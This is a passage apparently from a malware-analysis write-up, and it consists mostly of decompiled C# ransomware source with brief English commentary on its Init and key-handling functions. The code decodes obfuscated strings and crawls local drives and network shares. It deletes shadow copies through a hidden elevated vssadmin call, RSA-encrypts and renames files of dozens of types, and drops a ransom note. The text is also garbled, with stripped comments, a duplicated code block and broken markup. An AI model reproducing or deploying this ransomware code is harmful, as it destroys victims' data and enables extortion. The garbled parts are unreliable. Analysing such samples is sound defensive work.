0xfe, 0xf2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 0xfb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xa6, 0xeb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xeb, 0xf8, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 0xf8, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf8 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf3, 0xfc, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xff, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf4, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf2, 0xf2, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 0xe5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xf4, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 230 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xf7 }, this.X)); /* *   : .cd.ldf .mdf .max .dbf .epf .1cd .md .db .pdf .ppt .xls .doc .arj .tar .7z .rar .zip .tif .jpg .ai .bmp .png .cdr .psd .jpeg .docx .xlsx .pptx .accdb .mdb .rtf .odt .ods .odb .odg .cr2 .nef .nrf .orf .arw .sr2 .srf */ //    List&lt;string&gt; list = new List&lt;string&gt;(); Process process = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view", RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { bool flag4; process.Start(); string str4 = process.StandardOutput.ReadToEnd(); int startIndex = 0; int index = 0; goto Label_0A8B; Label_0A48: startIndex = str4.IndexOf('\\', startIndex); if (startIndex == -1) { goto Label_0A98; } index = str4.IndexOf(' ', startIndex); list.Add(str4.Substring(startIndex, index - startIndex)); startIndex = index; Label_0A8B: flag4 = true; goto Label_0A48; } catch { } Label_0A98: num5 = 0; while (num5 &lt; list.Count) { Process process2 = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view " + list[num5], RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { process2.Start(); string s = process2.StandardOutput.ReadToEnd(); byte[] bytes = Encoding.GetEncoding(0x4e3).GetBytes(s); char[] separator = new char[] { '\r', '\n' }; string[] strArray = Encoding.GetEncoding("CP866").GetString(bytes).Split(separator); for (int j = 0; j &lt; strArray.Length; j++) { if (strArray[j].IndexOf("") &gt; -1) { this.FullList.Add(list[num5] + @"\" + strArray[j].Substring(0, strArray[j].IndexOf(""))); } } } catch { } num5++; } ///    ...RSA 2048 RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); this.publicKey = provider.ToXmlString(false); //     XML this.privateKey = this.CryptKey(provider.ToXmlString(true)); //      ... } /////        ssda.far private void SaveKey(string f, string k) { string str = this.keyfile.Substring(0, this.keyfile.Length - 4); if (!File.Exists(f + @"\" + this.keyfile)) { try { File.WriteAllText(f + @"\" + this.keyfile, k); } catch { } } else { try { File.WriteAllText(string.Concat(new object[] { f, @"\", str, this.AmountFiles(f), ".", this.kfExt }), k); } catch { } } } /////              private void SaveNotes() { List&lt;string&gt; list = new List&lt;string&gt; { //     Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), //   Environment.GetFolderPath(Environment.SpecialFolder.Personal) //   }; for (int i = 0; i &lt; list.Count; i++) //    { this.SaveKey(list[i], this.privateKey); //     ssda.far this.AddNote(list[i]); //      } } /////   private void GetDirs(DirectoryInfo pth) { try { DirectoryInfo[] directories = pth.GetDirectories(); foreach (DirectoryInfo info in directories) { this.GetFiles(info); this.GetDirs(info); } } catch { } } /////       private void GetDrives() { try { string[] logicalDrives = Environment.GetLogicalDrives(); for (int i = 0; i &lt; logicalDrives.Length; i++) { DriveInfo info = new DriveInfo(logicalDrives[i]); if ((info.DriveType == DriveType.Fixed) || (info.DriveType == DriveType.Network)) { this.GetDirs(info.RootDirectory); } } } catch { } } ////      ... private void GetFiles(DirectoryInfo folder) { try { string[] files = Directory.GetFiles(folder.FullName, "*.*"); foreach (string str in files) { foreach (string str2 in this.extensions) //    { if ((str.ToLower().IndexOf(str2) &gt; -1) &amp;&amp; (str.ToLower().IndexOf(str2 + ".") == -1)) { string str3 = str; if (str.IndexOf(this.vNF) == -1) { this.CF(str3); ///  ... } } } } } catch { } } } }</span></span></code> , 0xf4, 0xe8, 0xc7, <code class="cs hljs"><span class="hljs-keyword"><span class="hljs-keyword">namespace</span></span> <span class="hljs-title"><span class="hljs-title">nekema</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">public</span></span> <span class="hljs-keyword"><span class="hljs-keyword">class</span></span> <span class="hljs-title"><span class="hljs-title">Form1</span></span> : <span class="hljs-title"><span class="hljs-title">Form</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">private</span></span> <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> blocksize = <span class="hljs-number"><span class="hljs-number">0xf5</span></span>; <span class="hljs-comment"><span class="hljs-comment">//245  . private IContainer components = null; private List&lt;string&gt; extensions = new List&lt;string&gt;(); //   private List&lt;string&gt; FullList = new List&lt;string&gt;(); //    private string keyCode; //   .  . private string keyfile = ""; //    "ssda.far" private string kfExt = ""; //   "far" private string kfName = ""; //   "ssda" private static readonly int MAX_PATH = 260; //   private string pbK = ""; //        . private string privateKey = ""; //        private string publicKey = ""; //     . private int repeatCount = 3; //    private List&lt;string&gt; SpecFolders = new List&lt;string&gt;(); private string vNF = ""; //   HOW--TO--RETURN--YOUR--FILES.jpg private byte X = 0x91; // //      DEXOR = 145 //////        HOW--TO--RETURN--YOUR--FILES.jpg private void AddNote(string f) { string currentDirectory = Environment.CurrentDirectory; if (f != currentDirectory) { try { if (!File.Exists(f + @"\" + this.vNF)) { Resources.ne5.Save(f + @"\" + this.vNF); } } catch { } } } ////////   -   private void CF(string f1) { byte[] destinationArray = new byte[this.blocksize]; try { byte[] sourceArray = File.ReadAllBytes(f1); if ((sourceArray.Length / (this.repeatCount + 5)) &gt;= this.blocksize) { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.publicKey); byte[] buffer3 = new byte[sourceArray.Length + (this.repeatCount * 11)]; byte[] buffer4 = new byte[sourceArray.Length - (this.repeatCount * this.blocksize)]; for (int i = 0; i &lt; this.repeatCount; i++) { Array.Copy(sourceArray, this.blocksize * i, destinationArray, 0, this.blocksize); byte[] buffer5 = provider.Encrypt(destinationArray, false); Array.Copy(buffer5, 0, buffer3, i * (this.blocksize + 11), buffer5.Length); } Array.Copy(sourceArray, this.repeatCount * this.blocksize, buffer4, 0, buffer4.Length); Array.Copy(buffer4, 0, buffer3, this.repeatCount * (this.blocksize + 11), buffer4.Length); try { File.WriteAllBytes(f1, buffer3); File.Move(f1, f1 + this.keyCode); } catch { } } } catch { } } //////          -   private string CryptKey(string s) { string str = ""; byte[] array = new byte[s.Length]; byte[] destinationArray = new byte[this.blocksize]; byte[] bytes = new byte[this.blocksize + 11]; double num = Math.Ceiling((double) (((double) s.Length) / ((double) this.blocksize))); if (s.Length &lt; (num * this.blocksize)) { int length = s.Length; for (int i = 0; i &lt; ((num * this.blocksize) - length); i++) { s = s + " "; } } array = Encoding.Default.GetBytes(s); Array.Reverse(array); try { RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); provider.FromXmlString(this.pbK); for (int j = 0; j &lt; num; j++) { Array.Copy(array, j * this.blocksize, destinationArray, 0, this.blocksize); bytes = provider.Encrypt(destinationArray, false); str = str + Encoding.Default.GetString(bytes); } } catch { } return str; } /////     private void DelS() { byte[] a = new byte[] { 0xe7, 0xe2, 0xe2, 240, 0xf5, 0xfc, 0xf8, 0xff, 0xbf, 0xf4, 0xe9, 0xf4 }; byte[] buffer2 = new byte[] { 0xd5, 0xf4, 0xfd, 0xf4, 0xe5, 0xf4, 0xb1, 0xc2, 0xf9, 240, 0xf5, 0xfe, 230, 0xe2, 0xb1, 190, 0xd0, 0xfd, 0xfd, 0xb1, 190, 0xc0, 0xe4, 0xf8, 0xf4, 0xe5 }; Process process = new Process { StartInfo = { FileName = this.DeXOR(a, this.X), Arguments = this.DeXOR(buffer2, this.X), WindowStyle = ProcessWindowStyle.Hidden, CreateNoWindow = true, UseShellExecute = true, Verb = "runas" } }; try { process.Start(); } catch { } } /////          XOR private string DeXOR(byte[] A, int x) { string str = ""; byte[] bytes = new byte[A.Length]; for (int i = 0; i &lt; A.Length; i++) { bytes[i] = (byte) (A[i] ^ x); } return (str = Encoding.Default.GetString(bytes)); } /////    . private void Init() { this.Prep(); //  this.SaveNotes(); //      this.GetDrives(); //   this.NetScan(); //   this.SetDesktopWallpaper(); //        ,    } private void Prep() { int num5; //  a = ssda.far byte[] a = new byte[] { 0xe2, 0xe2, 0xf5, 240, 0xbf, 0xf7, 240, 0xe3 }; //buffer2 = HOW--TO--RETURN--YOUR--FILES.jpg byte[] buffer2 = new byte[] {0xd9, 0xde, 0xc6, 0xbc, 0xbc, 0xc5, 0xde, 0xbc, 0xbc, 0xc3, 0xd4, 0xc5, 0xc4, 0xc3, 0xdf, 0xbc, 0xbc, 200, 0xde, 0xc4, 0xc3, 0xbc, 0xbc, 0xd7, 0xd8, 0xdd, 0xd4, 0xc2, 0xbf, 0xfb, 0xe1, 0xf6}; //buffer3 = &lt;RSAKeyValue &lt;Modulus&gt;+fFYiO9CH9iZwwzlsQ3X+qZ7Uyx290OhZ1WvLt6cmDd5oRsLoHLnoGws1CWFMOGFjtbaROSkTg3W+72/TjzHkuPp2W/RC7FBC4JpgguCi4x4ye4HEwRkQ75tHhig08hRKm1a7wlwYl8zLAzM8AwTPLh770MOzPqF1fJMKZCAtdUgIKdYNAkrP18sRbshkGNjwjMhMLNbKTaYfo3qIS4vtVUQtcw+g9ys3ZFZetKEl0ZMJEp4X7b4HK9vqUohPBYfBszXY6ion5m5tSSfhJK6OX2HPaU6RDcajTeEcmk9it9x73drJleZ1G+tVgL6duLX/uOWPVyi0rhyvYmRrGNcIQ==&lt;/Modulus&gt;&lt;Exponent&gt;AQAB&lt;/Exponent&gt;&lt;/RSAKeyValue&gt; byte[] buffer3 = new byte[] { 0xad, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf, 0xad, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xba, 0xf7, 0xd7, 200, 0xf8, 0xde, 0xa8, 210, 0xd9, 0xa8, 0xf8, 0xcb, 230, 230, 0xeb, 0xfd, 0xe2, 0xc0, 0xa2, 0xc9, 0xba, 0xe0, 0xcb, 0xa6, 0xc4, 0xe8, 0xe9, 0xa3, 0xa8, 0xa1, 0xde, 0xf9, 0xcb, 160, 0xc6, 0xe7, 0xdd, 0xe5, 0xa7, 0xf2, 0xfc, 0xd5,0xf5, 0xa4, 0xfe, 0xc3, 0xe2, 0xdd, 0xfe, 0xd9, 0xdd, 0xff, 0xfe, 0xd6, 230, 0xe2, 160, 210,0xc6, 0xd7, 220, 0xde, 0xd6, 0xd7, 0xfb, 0xe5, 0xf3, 240, 0xc3, 0xde, 0xc2, 250, 0xc5, 0xf6, 0xa2, 0xc6, 0xba, 0xa6, 0xa3, 190, 0xc5, 0xfb, 0xeb, 0xd9, 250, 0xe4, 0xc1, 0xe1, 0xa3, 0xc6,190, 0xc3, 210, 0xa6, 0xd7, 0xd3, 210, 0xa5, 0xdb, 0xe1, 0xf6, 0xf6, 0xe4, 210, 0xf8, 0xa5, 0xe9, 0xa5, 0xe8, 0xf4, 0xa5, 0xd9, 0xd4, 230, 0xc3, 250, 0xc0, 0xa6, 0xa4, 0xe5, 0xd9, 0xf9, 0xf8, 0xf6, 0xa1, 0xa9, 0xf9, 0xc3, 0xda, 0xfc, 160, 240, 0xa6, 230, 0xfd, 230, 200, 0xfd, 0xa9, 0xeb, 0xdd, 0xd0, 0xeb, 220, 0xa9, 0xd0, 230, 0xc5, 0xc1, 0xdd, 0xf9, 0xa6, 0xa6, 0xa1, 220, 0xde, 0xeb, 0xc1, 0xe0, 0xd7, 160, 0xf7, 0xdb, 220, 0xda, 0xcb, 210, 0xd0, 0xe5, 0xf5, 0xc4, 0xf6, 0xd8, 0xda, 0xf5, 200, 0xdf, 0xd0, 250, 0xe3, 0xc1, 160, 0xa9, 0xe2, 0xc3, 0xf3, 0xe2, 0xf9, 250, 0xd6, 0xdf, 0xfb, 230, 0xfb, 220, 0xf9, 220, 0xdd, 0xdf, 0xf3, 0xda, 0xc5, 240, 200, 0xf7, 0xfe, 0xa2, 0xe0, 0xd8, 0xc2, 0xa5, 0xe7, 0xe5, 0xc7, 0xc4, 0xc0, 0xe5, 0xf2, 230, 0xba, 0xf6, 0xa8, 0xe8, 0xe2, 0xa2, 0xcb, 0xd7, 0xcb, 0xf4, 0xe5, 0xda, 0xd4, 0xfd, 0xa1, 0xcb, 220, 0xdb, 0xd4, 0xe1, 0xa5, 0xc9, 0xa6, 0xf3, 0xa5, 0xd9, 0xda, 0xa8, 0xe7, 0xe0, 0xc4, 0xfe, 0xf9, 0xc1, 0xd3, 200, 0xf7, 0xd3, 0xe2, 0xeb, 0xc9, 200, 0xa7, 0xf8, 0xfe, 0xff, 0xa4, 0xfc, 0xa4, 0xe5, 0xc2, 0xc2, 0xf7, 0xf9, 0xdb, 0xda, 0xa7, 0xde, 0xc9, 0xa3, 0xd9, 0xc1, 240, 0xc4, 0xa7, 0xc3, 0xd5, 0xf2, 240, 0xfb, 0xc5, 0xf4, 0xd4, 0xf2, 0xfc, 250, 0xa8, 0xf8, 0xe5, 0xa8, 0xe9, 0xa6, 0xa2, 0xf5, 0xe3, 0xdb, 0xfd, 0xf4, 0xcb, 160, 0xd6, 0xba, 0xe5, 0xc7, 0xf6, 0xdd, 0xa7, 0xf5, 0xe4, 0xdd, 0xc9, 190, 0xe4, 0xde, 0xc6, 0xc1, 0xc7, 0xe8, 0xf8, 0xa1, 0xe3, 0xf9, 0xe8, 0xe7, 200, 0xfc, 0xc3, 0xe3, 0xd6, 0xdf, 0xf2, 0xd8, 0xc0, 0xac, 0xac, 0xad, 190, 220, 0xfe, 0xf5, 0xe4, 0xfd, 0xe4, 0xe2, 0xaf, 0xad, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xd0, 0xc0, 0xd0, 0xd3, 0xad, 190, 0xd4, 0xe9, 0xe1, 0xfe, 0xff, 0xf4, 0xff, 0xe5, 0xaf, 0xad, 190, 0xc3, 0xc2, 0xd0, 0xda, 0xf4, 0xe8, 0xc7, 240, 0xfd, 0xe4, 0xf4, 0xaf}; //  Windows Vista   -    . if (Environment.OSVersion.Version.Major &gt; 5) { new Thread(new ThreadStart(this.DelS)).Start(); } //       ... this.pbK = this.DeXOR(buffer3, this.X); string str = this.DeXOR(buffer2, this.X); this.vNF = this.DeXOR(buffer2, this.X); this.keyfile = this.DeXOR(a, this.X); this.kfExt = this.RetFExt(this.keyfile); this.kfName = this.RetFName(this.keyfile); this.keyCode = "."; //      Random random = new Random(); random.Next(0x61, 0x7a); for (int i = 0; i &lt; 1; i++) { this.keyCode = this.keyCode + Convert.ToChar(random.Next(0x61, 0x7a)).ToString(); } string[] textArray1 = new string[] { this.keyCode, (DateTime.Now.Day + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString(), (DateTime.Now.Month + 10).ToString(), Convert.ToChar(random.Next(0x61, 0x7a)).ToString() }; this.keyCode = string.Concat(textArray1); //      ... //       ... string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.System); folderPath = folderPath.Substring(0, folderPath.ToLower().IndexOf(@"\system")); string str3 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles); this.SpecFolders.Add(folderPath.ToLower()); this.SpecFolders.Add(str3.ToLower()); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xc3 }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xb5, 0xc3, 0xd4, 210, 200, 210, 0xdd, 0xd4, 0xbf, 0xd3, 0xd8, 0xdf }, this.X)); this.SpecFolders.Add(this.DeXOR(new byte[] { 0xc2, 0xe8, 0xe2, 0xe5, 0xf4, 0xfc, 0xb1, 0xc7, 0xfe, 0xfd, 0xe4, 0xfc, 0xf4, 0xb1, 0xd8, 0xff, 0xf7, 0xfe, 0xe3, 0xfc, 240, 0xe5, 0xf8, 0xfe, 0xff }, this.X)); /*  ... c:\windows c:\program files (x86) RECYCLER $RECYCLE.BIN System Volume Information */ ///    this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfd, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 240, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf4, 0xe1, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 160, 0xf2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xf5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 0xfb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xa6, 0xeb }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 240, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xeb, 0xf8, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe5, 0xf8, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf8 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf3, 0xfc, 0xe1 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xff, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xf5, 0xe3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe2, 0xf5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfb, 0xe1, 0xf4, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf5, 0xfe, 0xf2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe9, 0xfd, 0xe2, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe1, 0xe1, 0xe5, 0xe9 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xf2, 0xf2, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfc, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe3, 0xe5, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe5 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xe2 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xf5, 0xf6 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xf2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xf4, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xff, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xfe, 0xe3, 0xf7 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 240, 0xe3, 230 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xa3 }, this.X)); this.extensions.Add(this.DeXOR(new byte[] { 0xbf, 0xe2, 0xe3, 0xf7 }, this.X)); /* *   : .cd.ldf .mdf .max .dbf .epf .1cd .md .db .pdf .ppt .xls .doc .arj .tar .7z .rar .zip .tif .jpg .ai .bmp .png .cdr .psd .jpeg .docx .xlsx .pptx .accdb .mdb .rtf .odt .ods .odb .odg .cr2 .nef .nrf .orf .arw .sr2 .srf */ //    List&lt;string&gt; list = new List&lt;string&gt;(); Process process = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view", RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { bool flag4; process.Start(); string str4 = process.StandardOutput.ReadToEnd(); int startIndex = 0; int index = 0; goto Label_0A8B; Label_0A48: startIndex = str4.IndexOf('\\', startIndex); if (startIndex == -1) { goto Label_0A98; } index = str4.IndexOf(' ', startIndex); list.Add(str4.Substring(startIndex, index - startIndex)); startIndex = index; Label_0A8B: flag4 = true; goto Label_0A48; } catch { } Label_0A98: num5 = 0; while (num5 &lt; list.Count) { Process process2 = new Process { StartInfo = { FileName = "cmd", Arguments = "/C net view " + list[num5], RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true } }; try { process2.Start(); string s = process2.StandardOutput.ReadToEnd(); byte[] bytes = Encoding.GetEncoding(0x4e3).GetBytes(s); char[] separator = new char[] { '\r', '\n' }; string[] strArray = Encoding.GetEncoding("CP866").GetString(bytes).Split(separator); for (int j = 0; j &lt; strArray.Length; j++) { if (strArray[j].IndexOf("") &gt; -1) { this.FullList.Add(list[num5] + @"\" + strArray[j].Substring(0, strArray[j].IndexOf(""))); } } } catch { } num5++; } ///    ...RSA 2048 RSACryptoServiceProvider provider = new RSACryptoServiceProvider(0x800); this.publicKey = provider.ToXmlString(false); //     XML this.privateKey = this.CryptKey(provider.ToXmlString(true)); //      ... } /////        ssda.far private void SaveKey(string f, string k) { string str = this.keyfile.Substring(0, this.keyfile.Length - 4); if (!File.Exists(f + @"\" + this.keyfile)) { try { File.WriteAllText(f + @"\" + this.keyfile, k); } catch { } } else { try { File.WriteAllText(string.Concat(new object[] { f, @"\", str, this.AmountFiles(f), ".", this.kfExt }), k); } catch { } } } /////              private void SaveNotes() { List&lt;string&gt; list = new List&lt;string&gt; { //     Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), //   Environment.GetFolderPath(Environment.SpecialFolder.Personal) //   }; for (int i = 0; i &lt; list.Count; i++) //    { this.SaveKey(list[i], this.privateKey); //     ssda.far this.AddNote(list[i]); //      } } /////   private void GetDirs(DirectoryInfo pth) { try { DirectoryInfo[] directories = pth.GetDirectories(); foreach (DirectoryInfo info in directories) { this.GetFiles(info); this.GetDirs(info); } } catch { } } /////       private void GetDrives() { try { string[] logicalDrives = Environment.GetLogicalDrives(); for (int i = 0; i &lt; logicalDrives.Length; i++) { DriveInfo info = new DriveInfo(logicalDrives[i]); if ((info.DriveType == DriveType.Fixed) || (info.DriveType == DriveType.Network)) { this.GetDirs(info.RootDirectory); } } } catch { } } ////      ... private void GetFiles(DirectoryInfo folder) { try { string[] files = Directory.GetFiles(folder.FullName, "*.*"); foreach (string str in files) { foreach (string str2 in this.extensions) //    { if ((str.ToLower().IndexOf(str2) &gt; -1) &amp;&amp; (str.ToLower().IndexOf(str2 + ".") == -1)) { string str3 = str; if (str.IndexOf(this.vNF) == -1) { this.CF(str3); ///  ... } } } } } catch { } } } }</span></span></code> </pre><br></div></div><br>  Focus on the main functions to understand the algorithm: <br>  After initializing and creating an invisible window, we get into the init () function <br><br><pre> <code class="cs hljs"> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">private</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">void</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Init</span></span></span><span class="hljs-function">(</span><span class="hljs-params"></span><span class="hljs-function"><span class="hljs-params"></span>)</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.Prep(); <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.SaveNotes(); <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.GetDrives(); <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.NetScan(); <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.SetDesktopWallpaper(); }</code> </pre> <br>  <b>Prep ()</b> - initializes variables, decrypts strings, creates crypto-providers, deletes shadow copies of files. <br><br>  At the end of the function, the most interesting: <br><br><pre> <code class="cs hljs"> RSACryptoServiceProvider provider = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> RSACryptoServiceProvider(<span class="hljs-number"><span class="hljs-number">0x800</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.publicKey = provider.ToXmlString(<span class="hljs-literal"><span class="hljs-literal">false</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.privateKey = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.CryptKey(provider.ToXmlString(<span class="hljs-literal"><span class="hljs-literal">true</span></span>));</code> </pre><br>  Creates a class <b>RSACryptoServiceProvider</b> with a key length of <b>2048</b> .  When creating a class, random values ‚Äã‚Äãof encryption keys are created.  The public key is stored in the variable <b>this.publicKey</b> , and in the variable <b>this.privateKey</b> are placed public and private keys, but encrypted with the public key that is stored in the variable <b>this.pbK</b> , as seen in the <b>CryptKey</b> function <b>(string s)</b> . <br><br>  Public key: <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">RSAKeyValue</span></span></span><span class="hljs-tag"> &lt;</span><span class="hljs-attr"><span class="hljs-tag"><span class="hljs-attr">Modulus</span></span></span><span 